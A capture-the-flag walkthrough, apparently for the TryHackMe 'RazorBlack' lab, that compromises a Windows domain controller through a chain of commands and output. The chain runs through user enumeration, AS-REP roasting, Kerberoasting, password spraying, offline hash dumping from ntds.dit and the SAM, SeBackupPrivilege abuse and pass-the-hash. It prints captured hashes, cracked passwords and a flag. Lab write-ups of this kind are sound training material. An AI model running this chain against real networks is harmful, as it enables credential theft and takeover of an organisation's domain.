# RazorBlack (10.10.195.122)

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-23 17:27:32Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-22T17:26:21
| Not valid after:  2025-10-22T17:26:21
| MD5:   9cce:679b:ee09:00c9:6514:30af:707e:97c0
| SHA-1: 0700:9b93:be55:58bb:41f3:8b47:e77b:7c0f:5151:2f0c
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQMkgLpAIxvZpMlOsG19YPbDANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdIQVZFTi1EQy5yYXowcmJsYWNrLnRobTAeFw0yNTA0MjIxNzI2
| MjFaFw0yNTEwMjIxNzI2MjFaMCIxIDAeBgNVBAMTF0hBVkVOLURDLnJhejByYmxh
| Y2sudGhtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6A15CTFPWD0J
| rpEkYxDEvCKZRKEZ9gdnKTszUWssvqGZy58pR/gvKVYk/+YXiOYQCHh1LWpijFF0
| 2ScZhJuqlIzKuM2fHjfUgEQB8PnF2L9f4q2SFlAO9bdtV3V7BC/O3KLvpgAy4PEu
| 3++/MJuKUGk1H38zZ+sv9Wm9dbEdW2y13lXwXmMjDYoOHH/fdYLk+2oKHiHOxWa2
| F8gncNMe42bZZbdSRz+SaQJQwAuONuFUE6o6NEPu+fBkn2osKuxXlKjL8MmOEgkA
| rlFk3oI4BbG2OX7nEhZV0esUCYn30IuSM6deqdtjudfk9bYZypHTdENvARnGMPg7
| JVQCshM5GQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAMwkqzZtQIBkNRdWZ+UEhDWylcHWUYnGO/M+
| bnSRXrUBbV7aT+Us7Lsa+njtTiyLy4exV5YmbAdmQ6/fabj9JlzrAK32UrIe/rOG
| rDUX8BQ3Qxjc/Buj19N2tfZVYV94gCaYcDOvHBaMZPhg/dw1VVWa7YMTmxAbg6+G
| LkElRLLlFUUYHgOwBUxTjtdyF4yK9npUWw0CxwYCMjVHAFa3sVZbFy+cQbh3KpGr
| aRk+7lnh1/+btvT47ejILRm3Xh3W2gvizUd0QPvpvPsl3N+tDkqRQcpsraEW0lHJ
| muS0vX6KVTd7ic+juy/LUaVOKbFy5TiCfQsdvLLjQ4cW34yK8dc=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2025-04-23T17:28:29+00:00
|_ssl-date: 2025-04-23T17:28:37+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49706/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
- domain: HAVEN-DC.raz0rblack.thm RAZ0RBLACK
- NFS
- DNS

# NFS

- with shommount we can see shares
```bash
showmount -e 10.10.195.122                                                  
Export list for 10.10.195.122:
/users (everyone)
```
- 2 files: 'employee_status.xlsx', 'sbradley.txt'
- users list:
```bash
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```
- created userlist with username-anarchy

# SMB

- null bind (no session)
- null user no session
- Guest disabled

# kerberos

- found naming convention:
```bash
kerbrute userenum -d raz0rblack.thm --dc 10.10.195.122 test_list.txt                     

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/23/25 - Ronnie Flathers @ropnop

2025/04/23 19:54:18 >  Using KDC(s):
2025/04/23 19:54:18 >   10.10.195.122:88

2025/04/23 19:54:19 >  [+] VALID USERNAME:       lvetrova@raz0rblack.thm
2025/04/23 19:54:20 >  [+] VALID USERNAME:       twilliams@raz0rblack.thm
2025/04/23 19:54:20 >  [+] VALID USERNAME:       sbradley@raz0rblack.thm
```

- found UF_DONT_REQUIRE_PREAUTH:
```bash
impacket-GetNPUsers  raz0rblack.thm/ -usersfile users.txt   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:10633ddf6dcbfa3e114574a170f1a883$99263371ecd14bd0da22ad257c7c5bb81606907e0ea80e2bd66e12da3e458486aa21c6f5a050fed59cecb3df12432cc53e18fa6d9a014c2de96766050305d825e039cd7383b3a98f5d5138dc2033a5f9cee2cfff6574c87862584ee51a3b62aeb968534c27b5137879e32b592ec7444dd402b6a5bbb4b8507cfa279fb247fd2f519c88c6e9d1ad3c2e5f160f0a5dc319a5984926646ed8851c5ee7483ab0b49715cb94a7b515e9354d60b34a9143408b3ba2289fcbc0d71221e59e71c1c3bc32f842dd0c3b6211c1d47828461ec13eed12de04cb0211a7bf6aa2a0786618c328135048c2f9009341c65d67e2358cb3a6
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- cracked pass: roastpotatoes

# SMB - twilliams

- share access:
```bash
nxc smb 10.10.195.122 -u users.txt  -p passwords.txt  --shares
SMB         10.10.195.122   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.195.122   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.195.122   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.195.122   445    HAVEN-DC         [*] Enumerated shares
SMB         10.10.195.122   445    HAVEN-DC         Share           Permissions     Remark
SMB         10.10.195.122   445    HAVEN-DC         -----           -----------     ------
SMB         10.10.195.122   445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.10.195.122   445    HAVEN-DC         C$                              Default share
SMB         10.10.195.122   445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.10.195.122   445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.10.195.122   445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.10.195.122   445    HAVEN-DC         trash                           Files Pending for deletion
```

- extracted users:
```bash
nxc smb 10.10.195.122 -u users.txt  -p passwords.txt  --users 
SMB         10.10.195.122   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.195.122   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.195.122   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.195.122   445    HAVEN-DC         -Username-                    -Last PW Set-       -BadPW- -Description-                                                                                   
SMB         10.10.195.122   445    HAVEN-DC         Administrator                 2021-02-23 14:20:14 0       Built-in account for administering the computer/domain                                          
SMB         10.10.195.122   445    HAVEN-DC         Guest                         <never>             0       Built-in account for guest access to the computer/domain                                        
SMB         10.10.195.122   445    HAVEN-DC         krbtgt                        2021-02-23 15:02:19 0       Key Distribution Center Service Account                                                         
SMB         10.10.195.122   445    HAVEN-DC         xyan1d3                       2021-02-23 15:17:17 0
SMB         10.10.195.122   445    HAVEN-DC         lvetrova                      2021-02-23 15:19:35 2
SMB         10.10.195.122   445    HAVEN-DC         sbradley                      <never>             0
SMB         10.10.195.122   445    HAVEN-DC         twilliams                     2021-02-23 15:20:52 0
SMB         10.10.195.122   445    HAVEN-DC         [*] Enumerated 7 local users: RAZ0RBLACK
```

- users:
```bash
Administrator
Guest
krbtgt
xyan1d3
lvetrova
sbradley
twilliams
```

- sbradley password change status

# SMB - sbradley

- changed password:
```bash
impacket-changepasswd raz0rblack.thm/sbradley:roastpotatoes@10.10.195.122
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

New password: 
Retype new password: 
[*] Changing the password of raz0rblack.thm\sbradley
[*] Connecting to DCE/RPC as raz0rblack.thm\sbradley
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.

# new password is: Password1!
```
- we have /trash share access

- dumped 3 files:
```bash
-rw-r--r-- 1 kali kali     1340 Apr 23 20:17 chat_log_20210222143423.txt
-rw-r--r-- 1 kali kali 18927164 Apr 23 20:17 experiment_gone_wrong.zip
-rw-r--r-- 1 kali kali       37 Apr 23 20:17 sbradley.txt
```

- zip file password protected
- cracked password after zip2john: electromagnetismo

- inside we have ntds.dit and system.hive after extraction with secretsdump we have a bunch of hashes
- trying hashes on users we found:
```bash
nxc smb 10.10.242.119 -u users.txt  -H domain_hashes.txt
SMB         10.10.242.119   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
```

# SMB - lvetrova

- kerberoast for xyan1d3:
```bash
impacket-GetUserSPNs -dc-ip 10.10.41.137 raz0rblack.thm/lvetrova -hashes aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d -request

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$9d402c086080dae398d150208d9635d3$5e9fe9886d2d482eb87ceab8574376899862ae00e1d172afe24d434c29372475ff7796a434baf9e6cd4dcc8447bd4a4d35055df78ea79e13d9294da5489bbc02b9797d9c3c275dc7d2ff9d4a075a31772ca885b711e8b65ba907e577e465a80a7cf828adadf2ef8a5032dcd67a56d4375e30f26f02437d88e986d13f5bf7cb0ba192c55a8cf8b940e7879e3ac3646af141dbd7e4a9b19ad4de48fb9c80068e856be57affb77e045bfb35c10bd90d57227792f11bfdb4e8162a8a9764d17c4cf140f4d8e7ef47cbf658959a25944e0e8e60a630d7cd211247eba7c4ca827753fb257b113686d7639675602908a77e3a2220540377811d2eb9a4469d336a6638c96a1701afddf714c4f540c445ee848c711fc728ecdaf754101af628e99f6fbe38eb9ed1f483e9c1ad628de7dd36a10a632b5c0777a2c6bf0a902679da9a847b0f23d9e2de9ee317eb0cf75170ade56152d4b6abadd46821f2c37eebb2e4fc733204409e3624fe9c5623ab8b0f5d7974b7bc4e95a1515e92242c17586acc4b636b3b2fa44e8f69b0d1059fc7d7924634a77d5c7d6a606a38d7b338f2e4d06437a887ca2df5ff2d7eed5f454630907071f57acb19be02e94b73c5f33ea0d2e6b332a7a470afbdd0e55fb3a413570e68f0f70bde764e982b0f797e6660dc6808e4774b72f7fe03a5189087901bb75fd80e050045d84368fb483537b5c46971d176eaa8771b5900a653c736d075dca6d567ad38347e528e3c57941d1b6ef1cfcd4821d94029fbe29506d09fa4dd9eaf01914047b3997f1d0210a4f87e7f078d1811cb6c3039e878cd6c8df16d476971f12e988ebf3655e048eb101cc8202015926be20232e3c19caaab213bc23ee773bf9ae9939fd5e20c253ae7e2549742d84f81683e6ac8be8514a27932cfa04c69b7904e380d1a49299bc1bd8ac432ac3c3ffdf46e629e316a092e38e7fc68405422b1877bd685744c0925e2c036fc51159c265292d01884a388651897776af1b9f17964cf8c745539d085c0d4b5148c5e91c6979ad1e1f414508fd9a64316104dc2b035d70d9ce3828a4818c354786d1c1b629516249b6cac3a446b89d561bf26cc649c84751f3fc2f8f76b140d9580abd13a046e6d611a9f67d4135a031a967a380a833b9d6ab87cc9e10379c252c842e511b717e20ac0216c9e70f8fc40e61840ec87d6ad867f42850b2813fa36e0eb8b0fe46387a01fb8533437f4ef771badd36b80bc28b6317b2c5cc76157787dbd36a292ee3039ed6af674834939e6755348032b1858b27e6332f8c990ef5041afd972dff51a916fa0fe2ebdf9ef25621f329fd05229f0f14e29d4324a900cc55c1b1714ee6fcb07102eb4d5683fed6edb4c8af1ed251d05c01d099da3f7fdb2d847afcb3ffda0b8ad3cc6492e082dbf021083
```

- cracked pass: cyanide9amine5628

# WINRM xyan1d3

- user has winrm access
- file: C:\Users\xyan1d3\xyan1d3.xml is a powershell credential file

```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> $data = Import-Clixml -Path C:\Users\xyan1d3\xyan1d3.xml
*Evil-WinRM* PS C:\Users\xyan1d3> $data.GetNetworkCredential().UserName
$data.GetNetworkCredential().Domain
$data.GetNetworkCredential().Password
Nope your flag is not here

LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
*Evil-WinRM* PS C:\Users\xyan1d3>
```
- user has SeBackupPrivilege:
```powershell
*Evil-WinRM* PS C:\Users\xyan1d3> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
- we can dump system and SAM
```powershell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
The operation completed successfully.

The operation completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Desktop> dir


    Directory: C:\Users\xyan1d3\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2025   3:21 PM          49152 sam.bak
-a----        4/23/2025   3:21 PM       17211392 system.bak


*Evil-WinRM* PS C:\Users\xyan1d3\Desktop> download sam.bak
                                        
Info: Downloading C:\Users\xyan1d3\Desktop\sam.bak to sam.bak
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\xyan1d3\Desktop> download system.bak
                                        
Info: Downloading C:\Users\xyan1d3\Desktop\system.bak to system.bak

Info: Download successful!
```

- with secrets dump we have administrator creds:
```bash
impacket-secretsdump -sam sam.bak  -system system.bak  LOCAL                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...

nxc winrm 10.10.41.137 -u Administrator -H '9689931bed40ca5a2ce1218210177f0c' 
WINRM       10.10.41.137    5985   HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 (name:HAVEN-DC) (domain:raz0rblack.thm)
WINRM       10.10.41.137    5985   HAVEN-DC         [+] raz0rblack.thm\Administrator:9689931bed40ca5a2ce1218210177f0c (Pwn3d!)
```
